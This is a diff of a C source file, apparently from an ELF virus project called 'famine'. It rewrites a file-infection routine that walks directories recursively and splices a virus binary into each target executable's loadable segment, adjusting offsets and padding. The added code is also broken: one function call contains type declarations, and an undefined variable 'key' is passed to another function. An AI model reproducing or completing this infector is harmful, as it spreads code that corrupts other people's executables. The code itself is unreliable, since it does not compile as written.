@@ -1,6 +1,64 @@
 #include "famine.h"
 
-void	try_open_file(t_elf *host_elf, char *file)
+int			get_size_needed(t_elf *elf, t_elf *virus_elf)
+{
+	Elf64_Phdr	*next;
+	int		diff;
+
+	//TODO: gérer si pas de next (aka inject.o -> inject SGF)
+	next = elf->pt_load;
+	diff = (virus_elf->size - (next->p_offset - (elf->pt_load->p_offset + elf->pt_load->p_filesz)));
+	return (diff);
+}
+
+// TODO: A changer
+void		*add_padding_segments(t_elf *elf, t_elf *virus_elf, void *src, void **dst, int nb_zero)
+{
+	int				size;
+	Elf64_Off		shoff;
+
+	size = get_size_needed(t_elf *elf, t_elf *virus_elf);
+	shoff = elf->header->e_shoff + nb_zero + size;
+	memcpy(*dst, src, (unsigned long)&elf->header->e_shoff - (unsigned long)src);
+	*dst += (unsigned long)&elf->header->e_shoff - (unsigned long)src;
+	memcpy(*dst, &shoff, sizeof(shoff));
+	*dst += sizeof(shoff);
+	src = (void *)&elf->header->e_shoff + sizeof(elf->header->e_shoff);
+	shoff = elf->header->e_shoff + nb_zero + size;
+	for (int i = 0; i < elf->header->e_phnum; i++)
+	{
+		if (elf->segments[i].p_offset > (unsigned long)elf->pt_load->p_offset + elf->pt_load->p_filesz)
+		{
+			shoff = elf->segments[i].p_offset + nb_zero + size;
+			memcpy(*dst, src, (unsigned long)&elf->segments[i].p_offset - (unsigned long)src);
+			*dst += (unsigned long)&elf->segments[i].p_offset - (unsigned long)src;
+			memcpy(*dst, &shoff, sizeof(shoff));
+			*dst += sizeof(shoff);
+			src = (void *)&elf->segments[i].p_offset + sizeof(elf->segments[i].p_offset);
+		}
+		else if ((unsigned long)&elf->segments[i] == (unsigned long)elf->pt_load)
+			src = update_segment_sz(src, dst, elf->pt_load, key);
+	}
+	return (src);
+}
+
+void	create_infection(void *dst, t_elf *elf, t_elf *virus_elf, int nb_zero)
+{
+	void		*src;
+
+	src = elf->addr;
+//	memcpy(dst, elf->addr, elf->size);
+//	memcpy(dst + elf->size, SIGNATURE, strlen(SIGNATURE));
+	memcpy(dst, src, elf->pt_load->p_offset + elf->pt_load->p_filesz);
+	dst += elf->pt_load->p_offset + elf->pt_load->p_filesz;
+	memcpy(dst, virus_elf->addr, virus_elf->size);
+	dst += virus_elf->size;
+	memset(dst, 0, nb_zero);
+	src += elf->pt_load->p_offset + elf->pt_load->p_filesz;
+	memcpy(dst, src, elf->size - (elf->pt_load->p_offset + elf->pt_load->p_filesz));
+}
+
+void	try_open_file(t_elf *virus_elf, char *file)
 {
 	int				ret;
 	int				fd;
@@ -24,7 +82,7 @@ void	try_open_file(t_elf *host_elf, char *file)
 				{
 					close(fd);
 					if (DEBUG)
-						debug_print_error(0, host_elf->filename, file);
+						debug_print_error(0, virus_elf->filename, file);
 					return ;
 				}
 				if (!memmem(elf.addr, elf.size, SIGNATURE, strlen(SIGNATURE)))
@@ -34,21 +92,27 @@ void	try_open_file(t_elf *host_elf, char *file)
 						munmap(elf.addr, elf.size);
 						close(fd);
 						if (DEBUG)
-							debug_print_error(ret, host_elf->filename, file);
+							debug_print_error(ret, virus_elf->filename, file);
 						return ;
 					}
-					char	*new = malloc(elf.size + strlen(SIGNATURE));
+					int		size_needed = get_size_needed(&elf, virus_elf);
+					int		nb_zero_to_add = PAGE_SIZE - (size_needed % PAGE_SIZE);
+					if (DEBUG)
+					{
+						printf("size_needed %d\n", size_needed);
+						printf("nb_zero_to_add %d\n", nb_zero_to_add);
+						printf("addition %d\n", size_needed + nb_zero_to_add);
+					}
+					char	*new = malloc(elf.size + virus_elf->size + nb_zero_to_add);
 					if (!new)
 					{
 						munmap(elf.addr, elf.size);
 						close(fd);
 						if (DEBUG)
-							debug_print_error(ret, host_elf->filename, file);
+							debug_print_error(ret, virus_elf->filename, file);
 						return ;
 					}
-					char	*ptr = new;
-					memcpy(ptr, elf.addr, elf.size);
-					memcpy(ptr + elf.size, SIGNATURE, strlen(SIGNATURE));
+					create_infection(new, &elf, virus_elf, nb_zero_to_add);
 					//
 					munmap(elf.addr, elf.size);
 					close(fd);
@@ -62,12 +126,12 @@ void	try_open_file(t_elf *host_elf, char *file)
 			}
 		}
 		else if (DEBUG)
-			debug_print_error(ret, host_elf->filename, file);
+			debug_print_error(ret, virus_elf->filename, file);
 		close(fd);
 	}
 }
 
-void	moving_through_path(t_elf *host_elf, char *path)
+void	moving_through_path(t_elf *virus_elf, char *path)
 {
 	DIR		*dir;
     struct	dirent *d;
@@ -88,16 +152,16 @@ void	moving_through_path(t_elf *host_elf, char *path)
 				strcat(new_path, "/");
 				strcat(new_path, d->d_name);
 				if (d->d_type == DT_DIR)
-					moving_through_path(host_elf, new_path);
+					moving_through_path(virus_elf, new_path);
 				else
-					try_open_file(host_elf, new_path);
+					try_open_file(virus_elf, new_path);
 				free(new_path);
 			}
 		}
 		closedir(dir);
 	}
 	else if (DEBUG)
-		debug_print_error(0, host_elf->filename, path);
+		debug_print_error(0, virus_elf->filename, path);
 }
 
 int		main(int argc, char *argv[])
